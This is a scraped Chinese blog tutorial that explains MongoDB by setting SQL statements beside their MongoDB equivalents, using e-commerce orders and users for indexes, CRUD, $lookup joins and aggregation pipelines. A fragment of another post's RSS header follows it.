                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#444;background-image:linear-gradient(90deg,rgba(59,59,59,.1) 3%,transparent 0),linear-gradient(1turn,rgba(122,120,121,.1) 3%,transparent 0);background-size:30px 30px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:34px;margin-bottom:16px;font-weight:700;line-height:1.3;cursor:text;color:#444;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body h1{font-size:41px;margin-bottom:34px;line-height:1.5}.markdown-body h1:before{content:""}.markdown-body h2{font-size:30px;padding-left:.4em;border-left:.4em solid #5e5e5e;border-bottom:1px solid #444}.markdown-body h2:after{content:"🕛";position:absolute;top:0;right:0;transition:all;animation:rotate 10s linear infinite}@keyframes rotate{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.markdown-body h3{border-left:.4em solid #8d8d8d;font-size:24px;padding-left:.4em}.markdown-body h4{font-size:20px}.markdown-body h5{font-size:16px}.markdown-body h6{font-size:14px}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body table,.markdown-body ul{margin:.8em 0}.markdown-body strong{font-weight:1000;position:relative;color:#444;padding:0 3px}.markdown-body em{font-weight:inherit}.markdown-body a{box-sizing:border-box;color:grey;position:relative}.markdown-body a:before{position:absolute;box-sizing:border-box;content:"Go -&gt;";left:0;width:100%;max-width:0;color:#fff;background-color:hsla(0,0%,50.2%,.8);white-space:nowrap;transition:.2s ease;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";position:absolute;bottom:0;left:0;width:100%;height:1px;background-color:grey}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:100%;padding-left:8px;border-radius:5px}.markdown-body hr{position:relative;width:100%;height:1px;border:none;margin-top:36px;margin-bottom:36px;background:linear-gradient(90deg,grey,#f1f1f1,#444,#444,#f1f1f1,grey);overflow:visible}.markdown-body ol,.markdown-body ul{padding-left:32px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol{counter-reset:my-counter}.markdown-body ol&gt;li{padding-left:6px;list-style:none;counter-increment:my-counter;position:relative}.markdown-body ol&gt;li:before{position:absolute;left:-1.5em;content:counter(my-counter);font-weight:700}.markdown-body ol&gt;li:first-child:before{content:"1️⃣"}.markdown-body ol&gt;li:nth-child(2):before{content:"2️⃣"}.markdown-body ol&gt;li:nth-child(3):before{content:"3️⃣"}.markdown-body ol&gt;li:nth-child(4):before{content:"4️⃣"}.markdown-body ol&gt;li:nth-child(5):before{content:"5️⃣"}.markdown-body ol&gt;li:nth-child(6):before{content:"6️⃣"}.markdown-body ol&gt;li:nth-child(7):before{content:"7️⃣"}.markdown-body ol&gt;li:nth-child(8):before{content:"8️⃣"}.markdown-body ol&gt;li:nth-child(9):before{content:"9️⃣"}.markdown-body ol&gt;li:nth-child(10):before{content:"🔟"}.markdown-body ul&gt;li{list-style:none;position:relative}.markdown-body ul&gt;li:before{z-index:10;position:absolute;left:-1.57em;content:"🔹";margin-right:12px}.markdown-body ul&gt;li input{margin-left:8px!important}.markdown-body blockquote{position:relative;background-color:#d3d3d3;padding:5px 10px;border-left:.2em solid #000;border-radius:3px;transition:all .8s ease}.markdown-body blockquote:hover{opacity:.7}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(69,69,77,.8);color:#fff;font-size:.87em;padding:.07em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:7px;overflow:hidden}.markdown-body pre:before{z-index:10;position:absolute;top:14px;left:14px;width:12px;height:12px;border-radius:50%;background:#fc625d;-webkit-box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;content:" "}.markdown-body pre:after{z-index:9;content:"";position:absolute;width:100%;height:40px;top:0;background-color:#1a1a1a}.markdown-body pre&gt;code{display:block;font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#171717;color:#bababa;font-size:14px;padding:40px 20px 20px}.markdown-body del{color:grey}.markdown-body table{margin-bottom:1.25rem;border-collapse:collapse}.markdown-body table td,.markdown-body table th{margin:0;padding:8px;line-height:20px;vertical-align:middle;border:1px solid #ddd}.markdown-body table thead,.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table thead th,.markdown-body table tr:nth-child(2n) th{font-weight:700;vertical-align:middle;color:#444}.markdown-body table tbody tr td{font-weight:400;color:#444}.markdown-body table tbody tr:hover{background-color:#d3d3d3}.markdown-body table tbody tr:hover td{color:#fff}.markdown-body img{max-width:100%;margin:0 12px}@media (max-width:720px){.markdown-body h1{font-size:32.8px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="hybrid">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1d1f21}.hljs::selection,.hljs span::selection{background:#373b41}.hljs::-moz-selection,.hljs span::-moz-selection{background:#373b41}.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#c5c8c6}.hljs-name,.hljs-title{color:#f0c674}.hljs-comment,.hljs-meta,.hljs-meta .hljs-keyword{color:#707880}.hljs-deletion,.hljs-link,.hljs-literal,.hljs-number,.hljs-symbol{color:#c66}.hljs-addition,.hljs-doctag,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string{color:#b5bd68}.hljs-attribute,.hljs-code,.hljs-selector-id{color:#b294bb}.hljs-bullet,.hljs-keyword,.hljs-selector-tag,.hljs-tag{color:#81a2be}.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-variable{color:#8abeb7}.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-selector-class,.hljs-type{color:#de935f}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>很高兴你能来阅读，过去一年多，我主要从事天猫国际商品以及订单相关数仓开发与数据分析工作。接下来会陆续分享这段经历中的实战问题、对应解决思路，以及数仓基础的进阶学习总结，希望我的分享能给大家带来参考和帮助～</p>
</blockquote>
<h2 data-id="heading-0">MongoDB深入与实战：基于SQL的对照解析</h2>
<p>MongoDB作为主流的文档型NoSQL数据库，其数据模型和查询逻辑与关系型数据库（SQL）存在本质差异，但可通过"概念映射+场景对照"的方式快速掌握。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31dd45e3b5b74ae1aebdc413a4bf6d8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5qmZ57yW56CB5pel5b-X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472271&amp;x-signature=R0gC2K8ARbO0Ilsgnt8f1NwvJOY%3D" alt="image.png" width="70%" loading="lazy"/>
<p>本文从核心概念对应入手，结合高频业务场景，将SQL语句与MongoDB操作进行精准匹配，并延伸MongoDB的进阶特性与实战优化技巧，实现从SQL思维到MongoDB思维的平滑过渡。</p>
<h3 data-id="heading-1">一、基础：MongoDB与SQL核心概念映射</h3>
<p>关系型数据库通过"数据库-表-行-列"组织数据，而MongoDB以"数据库-集合-文档-字段"的文档模型实现，二者核心概念存在明确对应关系，这是后续操作对照的基础。</p>













































<table><thead><tr><th>SQL概念</th><th>MongoDB概念</th><th>核心说明</th></tr></thead><tbody><tr><td>Database（数据库）</td><td>Database（数据库）</td><td>逻辑隔离单元，创建与使用语法相似（如USE db_name）</td></tr><tr><td>Table（表）</td><td>Collection（集合）</td><td>集合无需预定义结构，不同文档可包含不同字段</td></tr><tr><td>Row（行）</td><td>Document（文档）</td><td>以BSON格式（JSON扩展）存储，自带唯一主键_id</td></tr><tr><td>Column（列）</td><td>Field（字段）</td><td>字段类型灵活，支持嵌套文档、数组等复杂类型</td></tr><tr><td>Primary Key（主键）</td><td>_id字段</td><td>默认自动生成ObjectId，也可手动指定（需保证唯一）</td></tr><tr><td>Index（索引）</td><td>Index（索引）</td><td>支持单字段、复合索引等，语法与SQL逻辑相通</td></tr><tr><td>关键差异：MongoDB的"无模式"特性——集合不强制文档结构统一，可根据业务需求动态扩展字段，这与SQL表的固定列结构形成核心区别。</td><td/><td/></tr></tbody></table>
<ol>
<li>传统关系型数据库（如 MySQL）对<strong>非结构化 / 半结构化数据</strong>支持不足，难以高效存储商品属性、用户行为等多变数据。</li>
<li>关系型数据库的<strong>水平扩展能力弱</strong>，面对高并发（如电商大促）时，扩容成本高、效率低。</li>
<li>开发效率需求：MongoDB 采用文档模型，无需预先定义 Schema，迭代速度快，适配互联网产品快速试错的需求。</li>
</ol>
<h3 data-id="heading-2">二、核心场景：SQL与MongoDB操作实战对照</h3>
<p>以下以电商场景的"订单表（orders）"和"用户表（users）"为例，覆盖创建、增删改查、聚合统计等高频操作，实现SQL语句到MongoDB操作的直接映射。</p>
<h4 data-id="heading-3">场景1：结构定义与索引创建</h4>
<p>SQL需先定义表结构，MongoDB则通过插入文档隐式创建集合，索引创建语法逻辑与SQL一致。</p>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 创建订单表并定义结构</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
  id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  user_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  order_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">UNIQUE</span>,
  amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  status <span class="hljs-type">CHAR</span>(<span class="hljs-number">1</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'P'</span>, <span class="hljs-comment">-- P:待支付 A:已完成 C:已取消</span>
  create_time DATETIME <span class="hljs-keyword">DEFAULT</span> NOW(),
  <span class="hljs-keyword">PRIMARY</span> KEY (id),
  INDEX idx_user_status (user_id, status) <span class="hljs-comment">-- 复合索引</span>
);

<span class="hljs-comment">-- 创建用户表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
  user_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  username <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  phone <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),
  <span class="hljs-keyword">PRIMARY</span> KEY (user_id)
);
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 1. 隐式创建集合（插入文档时自动创建）</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">insertOne</span>({
  <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
  <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250001"</span>,
  <span class="hljs-attr">amount</span>: <span class="hljs-number">299.99</span>,
  <span class="hljs-attr">status</span>: <span class="hljs-string">"P"</span>,
  <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
});

<span class="hljs-comment">// 2. 显式创建集合（可选，可添加验证规则）</span>
db.<span class="hljs-title function_">createCollection</span>(<span class="hljs-string">"users"</span>, {
  <span class="hljs-attr">validator</span>: { <span class="hljs-comment">//  Schema验证（模拟SQL字段约束）</span>
    <span class="hljs-attr">$jsonSchema</span>: {
      <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"user_id"</span>, <span class="hljs-string">"username"</span>],
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">user_id</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> },
        <span class="hljs-attr">username</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> },
        <span class="hljs-attr">phone</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> }
      }
    }
  }
});

<span class="hljs-comment">// 3. 创建索引（对应SQL的INDEX）</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">user_id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">status</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">name</span>: <span class="hljs-string">"idx_user_status"</span> });
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">order_no</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> }); <span class="hljs-comment">// 唯一索引</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">user_id</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> });
</code></pre>
<h4 data-id="heading-4">场景2：数据插入操作</h4>
<p>SQL使用INSERT语句，MongoDB提供insertOne（单条）和insertMany（批量）方法，支持自动生成主键。</p>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 单条插入</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users(user_id, username, phone)
<span class="hljs-keyword">VALUES</span> ("u1001", "张三", "13800138000");

<span class="hljs-comment">-- 批量插入</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> orders(user_id, order_no, amount, status)
<span class="hljs-keyword">VALUES</span> 
("u1001", "ORD20250002", <span class="hljs-number">159.00</span>, "A"),
("u1002", "ORD20250003", <span class="hljs-number">329.50</span>, "P");
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 单条插入（_id自动生成）</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">insertOne</span>({
  <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
  <span class="hljs-attr">username</span>: <span class="hljs-string">"张三"</span>,
  <span class="hljs-attr">phone</span>: <span class="hljs-string">"13800138000"</span>
});

<span class="hljs-comment">// 批量插入（效率高于多次insertOne）</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">insertMany</span>([
  {
    <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
    <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250002"</span>,
    <span class="hljs-attr">amount</span>: <span class="hljs-number">159.00</span>,
    <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span>,
    <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
  },
  {
    <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1002"</span>,
    <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250003"</span>,
    <span class="hljs-attr">amount</span>: <span class="hljs-number">329.50</span>,
    <span class="hljs-attr">status</span>: <span class="hljs-string">"P"</span>,
    <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
  }
]);
</code></pre>
<h4 data-id="heading-5">场景3：数据查询操作（单表/关联）</h4>
<p>MongoDB的find方法对应SQL的SELECT，支持条件过滤、字段投影、排序等；多表关联则通过$lookup实现SQL的JOIN逻辑。</p>
<h5 data-id="heading-6">子场景3.1：单表条件查询与排序</h5>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 查询u1001用户的已完成订单，按创建时间倒序，只返回订单号、金额、创建时间</span>
<span class="hljs-keyword">SELECT</span> order_no, amount, create_time
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> "u1001" <span class="hljs-keyword">AND</span> status <span class="hljs-operator">=</span> "A"
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>;
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">find</span>(
  { <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>, <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span> }, <span class="hljs-comment">// 条件过滤（对应WHERE）</span>
  { <span class="hljs-attr">order_no</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">create_time</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">_id</span>: <span class="hljs-number">0</span> } <span class="hljs-comment">// 字段投影（1显示，0隐藏）</span>
).<span class="hljs-title function_">sort</span>({ <span class="hljs-attr">create_time</span>: -<span class="hljs-number">1</span> }); <span class="hljs-comment">// 排序（-1倒序，1正序）</span>
</code></pre>
<h5 data-id="heading-7">子场景3.2：多表关联查询（用户-订单）</h5>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 关联查询用户信息与对应订单，只显示已完成订单</span>
<span class="hljs-keyword">SELECT</span> u.username, u.phone, o.order_no, o.amount
<span class="hljs-keyword">FROM</span> users u
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> orders o 
  <span class="hljs-keyword">ON</span> u.user_id <span class="hljs-operator">=</span> o.user_id
<span class="hljs-keyword">WHERE</span> o.status <span class="hljs-operator">=</span> "A";
</code></pre>
<p><strong>MongoDB实现</strong></p>
<ul>
<li>说明：这块表关联，我们真实场景 大部分通过Java代码来实现，这里只是给大家举一个案例，仅仅参考。真实的订单表一般都是几千万的数据，个人理解写脚本不太友好;</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 用聚合管道的$lookup实现JOIN，$match过滤条件</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">aggregate</span>([
  {
    <span class="hljs-attr">$lookup</span>: { <span class="hljs-comment">// 关联订单集合</span>
      <span class="hljs-attr">from</span>: <span class="hljs-string">"orders"</span>, <span class="hljs-comment">// 关联的目标集合（对应SQL的JOIN表）</span>
      <span class="hljs-attr">localField</span>: <span class="hljs-string">"user_id"</span>, <span class="hljs-comment">// 本地关联字段</span>
      <span class="hljs-attr">foreignField</span>: <span class="hljs-string">"user_id"</span>, <span class="hljs-comment">// 目标集合关联字段</span>
      <span class="hljs-attr">as</span>: <span class="hljs-string">"user_orders"</span> <span class="hljs-comment">// 关联结果存储的字段名</span>
    }
  },
  { <span class="hljs-attr">$unwind</span>: <span class="hljs-string">"$user_orders"</span> }, <span class="hljs-comment">// 拆分数组（将关联结果展开）</span>
  { <span class="hljs-attr">$match</span>: { <span class="hljs-string">"user_orders.status"</span>: <span class="hljs-string">"A"</span> } }, <span class="hljs-comment">// 过滤已完成订单</span>
  {
    <span class="hljs-attr">$project</span>: { <span class="hljs-comment">// 筛选显示字段</span>
      <span class="hljs-attr">username</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">phone</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"user_orders.order_no"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"user_orders.amount"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">_id</span>: <span class="hljs-number">0</span>
    }
  }
]);
</code></pre>
<h4 data-id="heading-8">场景4：数据更新与删除</h4>
<p>MongoDB通过update系列方法实现更新，支持原子操作符（如<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>t</mi><mtext>、</mtext></mrow><annotation encoding="application/x-tex">set、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">、</span></span></span></span></span>inc），删除则对应deleteOne/deleteMany方法。</p>
<h5 data-id="heading-9">子场景4.1：更新操作（修改订单状态）</h5>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 将订单ORD20250002的状态改为已完成，并更新支付时间</span>
<span class="hljs-keyword">UPDATE</span> orders
<span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> "A", pay_time <span class="hljs-operator">=</span> NOW()
<span class="hljs-keyword">WHERE</span> order_no <span class="hljs-operator">=</span> "ORD20250002";
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// updateOne：只更新匹配的第一条；updateMany：更新所有匹配项</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">updateOne</span>(
  { <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250002"</span> }, <span class="hljs-comment">// 匹配条件</span>
  {
    <span class="hljs-attr">$set</span>: { <span class="hljs-comment">// 原子更新操作符，只修改指定字段</span>
      <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span>,
      <span class="hljs-attr">pay_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
    }
  }
);
</code></pre>
<h5 data-id="heading-10">子场景4.2：删除操作（清理取消的旧订单）</h5>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 删除2024年1月1日前创建的已取消订单</span>
<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> "C" <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&lt;</span> "2024-01-01";
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">deleteMany</span>(
  {
    <span class="hljs-attr">status</span>: <span class="hljs-string">"C"</span>,
    <span class="hljs-attr">create_time</span>: { <span class="hljs-attr">$lt</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"2024-01-01"</span>) } <span class="hljs-comment">// $lt对应SQL的&lt;</span>
  }
);
</code></pre>
<h4 data-id="heading-11">场景5：聚合统计（GROUP BY/HAVING）</h4>
<p>MongoDB的聚合管道（Aggregation Pipeline）是核心特性，通过多个阶段组合实现复杂统计，对应SQL的GROUP BY、HAVING等功能。</p>
<p><strong>SQL实现</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- 统计每个用户的已完成订单总金额，筛选总金额&gt;500的用户</span>
<span class="hljs-keyword">SELECT</span> user_id, <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">AS</span> total_amount, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> order_count
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> "A"
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id
<span class="hljs-keyword">HAVING</span> total_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">500</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> total_amount <span class="hljs-keyword">DESC</span>;
</code></pre>
<p><strong>MongoDB实现</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">aggregate</span>([
  { <span class="hljs-attr">$match</span>: { <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span> } }, <span class="hljs-comment">// 1. 先过滤数据（减少后续计算量）</span>
  {
    <span class="hljs-attr">$group</span>: { <span class="hljs-comment">// 2. 分组统计（对应GROUP BY）</span>
      <span class="hljs-attr">_id</span>: <span class="hljs-string">"$user_id"</span>, <span class="hljs-comment">// 分组字段（对应GROUP BY的user_id）</span>
      <span class="hljs-attr">total_amount</span>: { <span class="hljs-attr">$sum</span>: <span class="hljs-string">"$amount"</span> }, <span class="hljs-comment">// 求和（对应SUM(amount)）</span>
      <span class="hljs-attr">order_count</span>: { <span class="hljs-attr">$sum</span>: <span class="hljs-number">1</span> } <span class="hljs-comment">// 计数（对应COUNT(*)）</span>
    }
  },
  { <span class="hljs-attr">$match</span>: { <span class="hljs-attr">total_amount</span>: { <span class="hljs-attr">$gt</span>: <span class="hljs-number">500</span> } } }, <span class="hljs-comment">// 3. 筛选分组结果（对应HAVING）</span>
  { <span class="hljs-attr">$sort</span>: { <span class="hljs-attr">total_amount</span>: -<span class="hljs-number">1</span> } } <span class="hljs-comment">// 4. 排序</span>
]);
</code></pre>
<h3 data-id="heading-12">三、核心差异与最佳实践总结</h3>
<h4 data-id="heading-13">1. SQL与MongoDB核心差异</h4>






























<table><thead><tr><th>维度</th><th>SQL（关系型）</th><th>MongoDB（文档型）</th></tr></thead><tbody><tr><td>数据模型</td><td>固定表结构，需预定义schema</td><td>灵活文档模型，支持动态字段</td></tr><tr><td>关联方式</td><td>通过JOIN实现多表关联</td><td>通过$lookup或嵌套文档实现关联</td></tr><tr><td>查询逻辑</td><td>声明式SQL语句，单条语句完成复杂查询</td><td>聚合管道，多阶段组合实现复杂逻辑</td></tr><tr><td>扩展性</td><td>垂直扩展为主，水平扩展复杂</td><td>原生支持分片，水平扩展能力强</td></tr></tbody></table>
<h4 data-id="heading-14">2. 实战最佳实践</h4>
<p><strong>在我们真实的电商项目中，商品表和订单表都是使用的MongoDB存储的，主要是需求多，经常要新增字段。MySQL不易拓展;</strong></p>
<p><strong>商品数据存储</strong>：电商商品属性多样（如尺码、颜色，保质期等等参数），文档模型可灵活存储不同品类商品的差异化属性，支持快速查询和修改。</p>
<p><strong>订单数据存储</strong>：订单数据字段可能随业务迭代新增（如优惠券抵扣、各种配送备注，拦截时间等等），MongoDB 无需修改表结构即可适配，且查询速度快。</p>
<ul>
<li>
<p><strong>索引必加但不滥加</strong>：针对高频查询创建索引，避免对写入频繁的字段创建过多索引（影响写入性能）。</p>
</li>
<li>
<p><strong>批量操作提升效率</strong>：插入/更新多条数据时，优先使用insertMany/updateMany，减少网络交互。</p>
</li>
<li>
<p><strong>监控与调优</strong>：通过explain()分析查询执行计划，定位全表扫描等性能问题（如db.orders.find({}).explain("executionStats")）。</p>
</li>
</ul>
<hr/>
<p>📣非常感谢你阅读到这里，如果这篇文章对你有帮助，希望能留下你的点赞👍 关注❤️ 分享👥 留言💬thanks！！！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 时代真正流式解析+渲染双重优化的 Incremark]]></title>    <link>https://juejin.cn/post/7583906846986469422</link>    <guid>https://juejin.cn/post/7583906846986469422</guid>    <pubDate>2025-12-15T02:57:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906846986469422" data-draft-id="7583613222344769562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 时代真正流式解析+渲染双重优化的 Incremark"/> <meta itemprop="keywords" content="前端,Markdown,AI编程"/> <meta itemprop="datePublished" content="2025-12-15T02:57:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="king王一帅"/> <meta itemprop="url" content="https://juejin.cn/user/395479917018408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 时代真正流式解析+渲染双重优化的 Incremark
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479917018408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    king王一帅
